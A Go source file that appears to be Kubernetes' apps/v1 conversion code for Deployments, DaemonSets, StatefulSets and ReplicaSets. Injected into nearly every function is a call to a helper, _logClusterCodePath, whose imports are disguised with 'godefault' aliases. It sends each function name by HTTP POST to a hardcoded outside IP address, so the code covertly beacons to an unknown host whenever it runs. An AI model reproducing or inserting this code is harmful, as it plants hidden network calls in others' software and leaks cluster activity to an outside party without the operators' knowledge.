package v1

import (
 "fmt"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "strconv"
 appsv1 "k8s.io/api/apps/v1"
 "k8s.io/api/core/v1"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/conversion"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apimachinery/pkg/util/intstr"
 "k8s.io/kubernetes/pkg/apis/apps"
 api "k8s.io/kubernetes/pkg/apis/core"
 k8s_api_v1 "k8s.io/kubernetes/pkg/apis/core/v1"
)

func addConversionFuncs(scheme *runtime.Scheme) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 err := scheme.AddConversionFuncs(Convert_v1_StatefulSetSpec_To_apps_StatefulSetSpec, Convert_apps_StatefulSetSpec_To_v1_StatefulSetSpec, Convert_v1_StatefulSetUpdateStrategy_To_apps_StatefulSetUpdateStrategy, Convert_apps_StatefulSetUpdateStrategy_To_v1_StatefulSetUpdateStrategy, Convert_apps_RollingUpdateDaemonSet_To_v1_RollingUpdateDaemonSet, Convert_v1_RollingUpdateDaemonSet_To_apps_RollingUpdateDaemonSet, Convert_v1_StatefulSetStatus_To_apps_StatefulSetStatus, Convert_apps_StatefulSetStatus_To_v1_StatefulSetStatus, Convert_v1_Deployment_To_apps_Deployment, Convert_apps_Deployment_To_v1_Deployment, Convert_apps_DaemonSet_To_v1_DaemonSet, Convert_v1_DaemonSet_To_apps_DaemonSet, Convert_apps_DaemonSetSpec_To_v1_DaemonSetSpec, Convert_v1_DaemonSetSpec_To_apps_DaemonSetSpec, Convert_apps_DaemonSetUpdateStrategy_To_v1_DaemonSetUpdateStrategy, Convert_v1_DaemonSetUpdateStrategy_To_apps_DaemonSetUpdateStrategy, Convert_v1_DeploymentSpec_To_apps_DeploymentSpec, Convert_apps_DeploymentSpec_To_v1_DeploymentSpec, Convert_v1_DeploymentStrategy_To_apps_DeploymentStrategy, Convert_apps_DeploymentStrategy_To_v1_DeploymentStrategy, Convert_v1_RollingUpdateDeployment_To_apps_RollingUpdateDeployment, Convert_apps_RollingUpdateDeployment_To_v1_RollingUpdateDeployment, Convert_apps_ReplicaSetSpec_To_v1_ReplicaSetSpec, Convert_v1_ReplicaSetSpec_To_apps_ReplicaSetSpec)
 if err != nil {
  return err
 }
 return nil
}
func Convert_v1_DeploymentSpec_To_apps_DeploymentSpec(in *appsv1.DeploymentSpec, out *apps.DeploymentSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if in.Replicas != nil {
  out.Replicas = *in.Replicas
 }
 out.Selector = in.Selector
 if err := k8s_api_v1.Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 if err := Convert_v1_DeploymentStrategy_To_apps_DeploymentStrategy(&in.Strategy, &out.Strategy, s); err != nil {
  return err
 }
 out.RevisionHistoryLimit = in.RevisionHistoryLimit
 out.MinReadySeconds = in.MinReadySeconds
 out.Paused = in.Paused
 if in.ProgressDeadlineSeconds != nil {
  out.ProgressDeadlineSeconds = new(int32)
  *out.ProgressDeadlineSeconds = *in.ProgressDeadlineSeconds
 }
 return nil
}
func Convert_apps_DeploymentSpec_To_v1_DeploymentSpec(in *apps.DeploymentSpec, out *appsv1.DeploymentSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = &in.Replicas
 out.Selector = in.Selector
 if err := k8s_api_v1.Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 if err := Convert_apps_DeploymentStrategy_To_v1_DeploymentStrategy(&in.Strategy, &out.Strategy, s); err != nil {
  return err
 }
 if in.RevisionHistoryLimit != nil {
  out.RevisionHistoryLimit = new(int32)
  *out.RevisionHistoryLimit = int32(*in.RevisionHistoryLimit)
 }
 out.MinReadySeconds = int32(in.MinReadySeconds)
 out.Paused = in.Paused
 if in.ProgressDeadlineSeconds != nil {
  out.ProgressDeadlineSeconds = new(int32)
  *out.ProgressDeadlineSeconds = *in.ProgressDeadlineSeconds
 }
 return nil
}
func Convert_apps_DeploymentStrategy_To_v1_DeploymentStrategy(in *apps.DeploymentStrategy, out *appsv1.DeploymentStrategy, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Type = appsv1.DeploymentStrategyType(in.Type)
 if in.RollingUpdate != nil {
  out.RollingUpdate = new(appsv1.RollingUpdateDeployment)
  if err := Convert_apps_RollingUpdateDeployment_To_v1_RollingUpdateDeployment(in.RollingUpdate, out.RollingUpdate, s); err != nil {
   return err
  }
 } else {
  out.RollingUpdate = nil
 }
 return nil
}
func Convert_v1_DeploymentStrategy_To_apps_DeploymentStrategy(in *appsv1.DeploymentStrategy, out *apps.DeploymentStrategy, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Type = apps.DeploymentStrategyType(in.Type)
 if in.RollingUpdate != nil {
  out.RollingUpdate = new(apps.RollingUpdateDeployment)
  if err := Convert_v1_RollingUpdateDeployment_To_apps_RollingUpdateDeployment(in.RollingUpdate, out.RollingUpdate, s); err != nil {
   return err
  }
 } else {
  out.RollingUpdate = nil
 }
 return nil
}
func Convert_v1_RollingUpdateDeployment_To_apps_RollingUpdateDeployment(in *appsv1.RollingUpdateDeployment, out *apps.RollingUpdateDeployment, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := s.Convert(in.MaxUnavailable, &out.MaxUnavailable, 0); err != nil {
  return err
 }
 if err := s.Convert(in.MaxSurge, &out.MaxSurge, 0); err != nil {
  return err
 }
 return nil
}
func Convert_apps_RollingUpdateDeployment_To_v1_RollingUpdateDeployment(in *apps.RollingUpdateDeployment, out *appsv1.RollingUpdateDeployment, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if out.MaxUnavailable == nil {
  out.MaxUnavailable = &intstr.IntOrString{}
 }
 if err := s.Convert(&in.MaxUnavailable, out.MaxUnavailable, 0); err != nil {
  return err
 }
 if out.MaxSurge == nil {
  out.MaxSurge = &intstr.IntOrString{}
 }
 if err := s.Convert(&in.MaxSurge, out.MaxSurge, 0); err != nil {
  return err
 }
 return nil
}
func Convert_v1_Deployment_To_apps_Deployment(in *appsv1.Deployment, out *apps.Deployment, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.ObjectMeta = in.ObjectMeta
 if err := Convert_v1_DeploymentSpec_To_apps_DeploymentSpec(&in.Spec, &out.Spec, s); err != nil {
  return err
 }
 if revision, _ := in.Annotations[appsv1.DeprecatedRollbackTo]; revision != "" {
  if revision64, err := strconv.ParseInt(revision, 10, 64); err != nil {
   return fmt.Errorf("failed to parse annotation[%s]=%s as int64: %v", appsv1.DeprecatedRollbackTo, revision, err)
  } else {
   out.Spec.RollbackTo = new(apps.RollbackConfig)
   out.Spec.RollbackTo.Revision = revision64
  }
  out.Annotations = deepCopyStringMap(out.Annotations)
  delete(out.Annotations, appsv1.DeprecatedRollbackTo)
 } else {
  out.Spec.RollbackTo = nil
 }
 if err := Convert_v1_DeploymentStatus_To_apps_DeploymentStatus(&in.Status, &out.Status, s); err != nil {
  return err
 }
 return nil
}
func Convert_apps_Deployment_To_v1_Deployment(in *apps.Deployment, out *appsv1.Deployment, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.ObjectMeta = in.ObjectMeta
 out.Annotations = deepCopyStringMap(out.Annotations)
 if err := Convert_apps_DeploymentSpec_To_v1_DeploymentSpec(&in.Spec, &out.Spec, s); err != nil {
  return err
 }
 if in.Spec.RollbackTo != nil {
  if out.Annotations == nil {
   out.Annotations = make(map[string]string)
  }
  out.Annotations[appsv1.DeprecatedRollbackTo] = strconv.FormatInt(in.Spec.RollbackTo.Revision, 10)
 } else {
  delete(out.Annotations, appsv1.DeprecatedRollbackTo)
 }
 if err := Convert_apps_DeploymentStatus_To_v1_DeploymentStatus(&in.Status, &out.Status, s); err != nil {
  return err
 }
 return nil
}
func Convert_apps_RollingUpdateDaemonSet_To_v1_RollingUpdateDaemonSet(in *apps.RollingUpdateDaemonSet, out *appsv1.RollingUpdateDaemonSet, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if out.MaxUnavailable == nil {
  out.MaxUnavailable = &intstr.IntOrString{}
 }
 if err := s.Convert(&in.MaxUnavailable, out.MaxUnavailable, 0); err != nil {
  return err
 }
 return nil
}
func Convert_v1_RollingUpdateDaemonSet_To_apps_RollingUpdateDaemonSet(in *appsv1.RollingUpdateDaemonSet, out *apps.RollingUpdateDaemonSet, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if err := s.Convert(in.MaxUnavailable, &out.MaxUnavailable, 0); err != nil {
  return err
 }
 return nil
}
func Convert_apps_DaemonSet_To_v1_DaemonSet(in *apps.DaemonSet, out *appsv1.DaemonSet, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.ObjectMeta = in.ObjectMeta
 out.Annotations = deepCopyStringMap(out.Annotations)
 out.Annotations[appsv1.DeprecatedTemplateGeneration] = strconv.FormatInt(in.Spec.TemplateGeneration, 10)
 if err := Convert_apps_DaemonSetSpec_To_v1_DaemonSetSpec(&in.Spec, &out.Spec, s); err != nil {
  return err
 }
 if err := s.Convert(&in.Status, &out.Status, 0); err != nil {
  return err
 }
 return nil
}
func Convert_apps_DaemonSetSpec_To_v1_DaemonSetSpec(in *apps.DaemonSetSpec, out *appsv1.DaemonSetSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Selector = in.Selector
 if err := k8s_api_v1.Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 if err := Convert_apps_DaemonSetUpdateStrategy_To_v1_DaemonSetUpdateStrategy(&in.UpdateStrategy, &out.UpdateStrategy, s); err != nil {
  return err
 }
 out.MinReadySeconds = int32(in.MinReadySeconds)
 if in.RevisionHistoryLimit != nil {
  out.RevisionHistoryLimit = new(int32)
  *out.RevisionHistoryLimit = *in.RevisionHistoryLimit
 } else {
  out.RevisionHistoryLimit = nil
 }
 return nil
}
func Convert_apps_DaemonSetUpdateStrategy_To_v1_DaemonSetUpdateStrategy(in *apps.DaemonSetUpdateStrategy, out *appsv1.DaemonSetUpdateStrategy, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Type = appsv1.DaemonSetUpdateStrategyType(in.Type)
 if in.RollingUpdate != nil {
  out.RollingUpdate = &appsv1.RollingUpdateDaemonSet{}
  if err := Convert_apps_RollingUpdateDaemonSet_To_v1_RollingUpdateDaemonSet(in.RollingUpdate, out.RollingUpdate, s); err != nil {
   return err
  }
 }
 return nil
}
func Convert_v1_DaemonSet_To_apps_DaemonSet(in *appsv1.DaemonSet, out *apps.DaemonSet, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.ObjectMeta = in.ObjectMeta
 if err := Convert_v1_DaemonSetSpec_To_apps_DaemonSetSpec(&in.Spec, &out.Spec, s); err != nil {
  return err
 }
 if value, ok := in.Annotations[appsv1.DeprecatedTemplateGeneration]; ok {
  if value64, err := strconv.ParseInt(value, 10, 64); err != nil {
   return err
  } else {
   out.Spec.TemplateGeneration = value64
   out.Annotations = deepCopyStringMap(out.Annotations)
   delete(out.Annotations, appsv1.DeprecatedTemplateGeneration)
  }
 }
 if err := s.Convert(&in.Status, &out.Status, 0); err != nil {
  return err
 }
 return nil
}
func Convert_v1_DaemonSetSpec_To_apps_DaemonSetSpec(in *appsv1.DaemonSetSpec, out *apps.DaemonSetSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Selector = in.Selector
 if err := k8s_api_v1.Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 if err := Convert_v1_DaemonSetUpdateStrategy_To_apps_DaemonSetUpdateStrategy(&in.UpdateStrategy, &out.UpdateStrategy, s); err != nil {
  return err
 }
 if in.RevisionHistoryLimit != nil {
  out.RevisionHistoryLimit = new(int32)
  *out.RevisionHistoryLimit = *in.RevisionHistoryLimit
 } else {
  out.RevisionHistoryLimit = nil
 }
 out.MinReadySeconds = in.MinReadySeconds
 return nil
}
func Convert_v1_DaemonSetUpdateStrategy_To_apps_DaemonSetUpdateStrategy(in *appsv1.DaemonSetUpdateStrategy, out *apps.DaemonSetUpdateStrategy, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Type = apps.DaemonSetUpdateStrategyType(in.Type)
 if in.RollingUpdate != nil {
  out.RollingUpdate = &apps.RollingUpdateDaemonSet{}
  if err := Convert_v1_RollingUpdateDaemonSet_To_apps_RollingUpdateDaemonSet(in.RollingUpdate, out.RollingUpdate, s); err != nil {
   return err
  }
 }
 return nil
}
func Convert_apps_ReplicaSetSpec_To_v1_ReplicaSetSpec(in *apps.ReplicaSetSpec, out *appsv1.ReplicaSetSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = new(int32)
 *out.Replicas = int32(in.Replicas)
 out.MinReadySeconds = in.MinReadySeconds
 out.Selector = in.Selector
 if err := k8s_api_v1.Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 return nil
}
func Convert_v1_ReplicaSetSpec_To_apps_ReplicaSetSpec(in *appsv1.ReplicaSetSpec, out *apps.ReplicaSetSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if in.Replicas != nil {
  out.Replicas = *in.Replicas
 }
 out.MinReadySeconds = in.MinReadySeconds
 out.Selector = in.Selector
 if err := k8s_api_v1.Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 return nil
}
func Convert_v1_StatefulSetSpec_To_apps_StatefulSetSpec(in *appsv1.StatefulSetSpec, out *apps.StatefulSetSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if in.Replicas != nil {
  out.Replicas = *in.Replicas
 }
 if in.Selector != nil {
  in, out := &in.Selector, &out.Selector
  *out = new(metav1.LabelSelector)
  if err := s.Convert(*in, *out, 0); err != nil {
   return err
  }
 } else {
  out.Selector = nil
 }
 if err := k8s_api_v1.Convert_v1_PodTemplateSpec_To_core_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 if in.VolumeClaimTemplates != nil {
  in, out := &in.VolumeClaimTemplates, &out.VolumeClaimTemplates
  *out = make([]api.PersistentVolumeClaim, len(*in))
  for i := range *in {
   if err := s.Convert(&(*in)[i], &(*out)[i], 0); err != nil {
    return err
   }
  }
 } else {
  out.VolumeClaimTemplates = nil
 }
 if err := Convert_v1_StatefulSetUpdateStrategy_To_apps_StatefulSetUpdateStrategy(&in.UpdateStrategy, &out.UpdateStrategy, s); err != nil {
  return err
 }
 if in.RevisionHistoryLimit != nil {
  out.RevisionHistoryLimit = new(int32)
  *out.RevisionHistoryLimit = *in.RevisionHistoryLimit
 } else {
  out.RevisionHistoryLimit = nil
 }
 out.ServiceName = in.ServiceName
 out.PodManagementPolicy = apps.PodManagementPolicyType(in.PodManagementPolicy)
 return nil
}
func Convert_apps_StatefulSetSpec_To_v1_StatefulSetSpec(in *apps.StatefulSetSpec, out *appsv1.StatefulSetSpec, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Replicas = new(int32)
 *out.Replicas = in.Replicas
 if in.Selector != nil {
  in, out := &in.Selector, &out.Selector
  *out = new(metav1.LabelSelector)
  if err := s.Convert(*in, *out, 0); err != nil {
   return err
  }
 } else {
  out.Selector = nil
 }
 if err := k8s_api_v1.Convert_core_PodTemplateSpec_To_v1_PodTemplateSpec(&in.Template, &out.Template, s); err != nil {
  return err
 }
 if in.VolumeClaimTemplates != nil {
  in, out := &in.VolumeClaimTemplates, &out.VolumeClaimTemplates
  *out = make([]v1.PersistentVolumeClaim, len(*in))
  for i := range *in {
   if err := s.Convert(&(*in)[i], &(*out)[i], 0); err != nil {
    return err
   }
  }
 } else {
  out.VolumeClaimTemplates = nil
 }
 if in.RevisionHistoryLimit != nil {
  out.RevisionHistoryLimit = new(int32)
  *out.RevisionHistoryLimit = *in.RevisionHistoryLimit
 } else {
  out.RevisionHistoryLimit = nil
 }
 out.ServiceName = in.ServiceName
 out.PodManagementPolicy = appsv1.PodManagementPolicyType(in.PodManagementPolicy)
 if err := Convert_apps_StatefulSetUpdateStrategy_To_v1_StatefulSetUpdateStrategy(&in.UpdateStrategy, &out.UpdateStrategy, s); err != nil {
  return err
 }
 return nil
}
func Convert_v1_StatefulSetUpdateStrategy_To_apps_StatefulSetUpdateStrategy(in *appsv1.StatefulSetUpdateStrategy, out *apps.StatefulSetUpdateStrategy, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Type = apps.StatefulSetUpdateStrategyType(in.Type)
 if in.RollingUpdate != nil {
  out.RollingUpdate = new(apps.RollingUpdateStatefulSetStrategy)
  out.RollingUpdate.Partition = *in.RollingUpdate.Partition
 } else {
  out.RollingUpdate = nil
 }
 return nil
}
func Convert_apps_StatefulSetUpdateStrategy_To_v1_StatefulSetUpdateStrategy(in *apps.StatefulSetUpdateStrategy, out *appsv1.StatefulSetUpdateStrategy, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.Type = appsv1.StatefulSetUpdateStrategyType(in.Type)
 if in.RollingUpdate != nil {
  out.RollingUpdate = new(appsv1.RollingUpdateStatefulSetStrategy)
  out.RollingUpdate.Partition = new(int32)
  *out.RollingUpdate.Partition = in.RollingUpdate.Partition
 } else {
  out.RollingUpdate = nil
 }
 return nil
}
func Convert_v1_StatefulSetStatus_To_apps_StatefulSetStatus(in *appsv1.StatefulSetStatus, out *apps.StatefulSetStatus, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 out.ObservedGeneration = new(int64)
 *out.ObservedGeneration = in.ObservedGeneration
 out.Replicas = in.Replicas
 out.ReadyReplicas = in.ReadyReplicas
 out.CurrentReplicas = in.CurrentReplicas
 out.UpdatedReplicas = in.UpdatedReplicas
 out.CurrentRevision = in.CurrentRevision
 out.UpdateRevision = in.UpdateRevision
 if in.CollisionCount != nil {
  out.CollisionCount = new(int32)
  *out.CollisionCount = *in.CollisionCount
 }
 out.Conditions = make([]apps.StatefulSetCondition, len(in.Conditions))
 for i := range in.Conditions {
  if err := Convert_v1_StatefulSetCondition_To_apps_StatefulSetCondition(&in.Conditions[i], &out.Conditions[i], s); err != nil {
   return err
  }
 }
 return nil
}
func Convert_apps_StatefulSetStatus_To_v1_StatefulSetStatus(in *apps.StatefulSetStatus, out *appsv1.StatefulSetStatus, s conversion.Scope) error {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if in.ObservedGeneration != nil {
  out.ObservedGeneration = *in.ObservedGeneration
 }
 out.Replicas = in.Replicas
 out.ReadyReplicas = in.ReadyReplicas
 out.CurrentReplicas = in.CurrentReplicas
 out.UpdatedReplicas = in.UpdatedReplicas
 out.CurrentRevision = in.CurrentRevision
 out.UpdateRevision = in.UpdateRevision
 if in.CollisionCount != nil {
  out.CollisionCount = new(int32)
  *out.CollisionCount = *in.CollisionCount
 }
 out.Conditions = make([]appsv1.StatefulSetCondition, len(in.Conditions))
 for i := range in.Conditions {
  if err := Convert_apps_StatefulSetCondition_To_v1_StatefulSetCondition(&in.Conditions[i], &out.Conditions[i], s); err != nil {
   return err
  }
 }
 return nil
}
func deepCopyStringMap(m map[string]string) map[string]string {
 _logClusterCodePath()
 defer _logClusterCodePath()
 ret := make(map[string]string, len(m))
 for k, v := range m {
  ret[k] = v
 }
 return ret
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
